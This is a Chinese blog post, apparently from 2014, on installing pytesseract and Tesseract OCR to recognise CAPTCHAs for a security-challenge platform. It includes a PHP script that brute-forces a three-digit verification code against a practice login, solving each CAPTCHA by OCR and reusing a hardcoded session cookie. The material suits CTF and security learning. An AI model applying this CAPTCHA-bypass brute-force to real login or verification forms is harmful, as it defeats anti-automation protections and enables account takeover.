最近在做网络信息安全攻防学习平台的题目，发现有些题居然需要用到验证码识别，这玩意以前都觉得是高大上的东西，一直没有去研究，这次花了点时间研究了一下，当然只是一些基础的东西，高深的我也不会，分享一下给大家吧。

这次验证码识别，我使用的python来实现的，发现python果然是强大无比，但是在验证码识别库的安装上面有点小问题。

关于python验证码识别库，网上主要介绍的为pytesser及pytesseract，其实pytesser的安装有一点点麻烦，所以这里我不考虑，直接使用后一种库。

python验证码识别库安装

要安装pytesseract库，必须先安装其依赖的PIL及tesseract-ocr，其中PIL为图像处理库，而后面的tesseract-ocr则为google的ocr识别引擎。

1、PIL 下载地址：

PIL-1.1.7.win-amd64-py2.7.exe

PIL-1.1.7.win32-py2.7.exe

或者直接使用pillow来代替，使用方法基本没有什么区别。

http://www.lfd.uci.edu/~gohlke/pythonlibs/#pillow

2、tesseract-ocr下载地址：

tesseract-ocr-setup-3.02.02.exe

3、pytesseract安装

直接使用pip install pytesseract安装即可，或者使用easy_install pytesseract

python验证码识别方法

#!/usr/bin/env python
# -*- coding: gbk -*-
# -*- coding: utf_8 -*-
# Date: 2014/11/27
# Created by 独自等待
# 博客 http://www.waitalone.cn/
try:
    import pytesseract
    from PIL import Image
except ImportError:
    print '模块导入错误,请使用pip安装,pytesseract依赖以下库：'
    print 'http://www.lfd.uci.edu/~gohlke/pythonlibs/#pil'
    print 'http://code.google.com/p/tesseract-ocr/'
    raise SystemExit

image = Image.open('vcode.png')
vcode = pytesseract.image_to_string(image)
print vcode



识别率还挺高的，当然这也和验证码本身有关，因为这个验证码设计的比较容易识别。

![](D:/download/youdaonote-pull-master/data/Technology/Python/pytesser/images/B68508B6C2A2437A8EC101A79957A645128040728552.png)

python识别验证码，就是这么简单，大家还不快来试一试？

php验证码识别方法

关于php的验证码识别，这个我没有深入研究，但是用python实现完了以后就明白了，其实只要借助ocr识别库就可以了，直接贴上之前脚本关第9关的代码。

python实现的验证码识别破解实例请关注：

http://www.waitalone.cn/security-scripts-game.html

<?php
/**
 * Created by 独自等待
 * Date: 2014/11/20
 * Time: 9:27
 * Name: ocr.php
 * 独自等待博客：http://www.waitalone.cn/
 */
error_reporting(7);
if (!extension_loaded('curl')) exit('请开启CURL扩展,谢谢!');
crack_key();

function crack_key()
{
    $crack_url = 'http://1.hacklist.sinaapp.com/vcode7_f7947d56f22133dbc85dda4f28530268/login.php';
    for ($i = 100; $i <= 999; $i++) {
        $vcode = mkvcode();
        $post_data = array(
            'username' => 13388886666,
            'mobi_code' => $i,
            'user_code' => $vcode,
            'Login' => 'submit'
        );
        $response = send_pack('POST', $crack_url, $post_data);
        if (!strpos($response, 'error')) {
            system('cls');
            echo $response;
            break;
        }else{
            echo $response."\n";
        }
    }
}


function mkvcode()
{
    $vcode = '';
    $vcode_url = "http://1.hacklist.sinaapp.com/vcode7_f7947d56f22133dbc85dda4f28530268/vcode.php";
    $pic = send_pack('GET', $vcode_url);
    file_put_contents('vcode.png', $pic);
    $cmd = "\"D:\\Program Files (x86)\\Tesseract-OCR\\tesseract.exe\" vcode.png vcode";
    system($cmd);
    if (file_exists('vcode.txt')) {
        $vcode = file_get_contents('vcode.txt');
        $vcode = trim($vcode);
        $vcode = str_replace(' ', '', $vcode);
    }
    if (strlen($vcode) == 4) {
        return $vcode;
    } else {
        return mkvcode();
    }
}

//数据包发送函数
function send_pack($method, $url, $post_data = array())
{
    $cookie = 'saeut=218.108.135.246.1416190347811282;PHPSESSID=6eac12ef61de5649b9bfd8712b0f09c2';
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_HEADER, 0);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_COOKIE, $cookie);
    if ($method == 'POST') {
        curl_setopt($curl, CURLOPT_POST, 1);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $post_data);
    }
    $data = curl_exec($curl);
    curl_close($curl);
    return $data;
}






文中用到的文件下载

点我下载

相关文章：

http://vipscu.blog.163.com/blog/static/18180837220134234528457/ 

http://drops.wooyun.org/tips/141 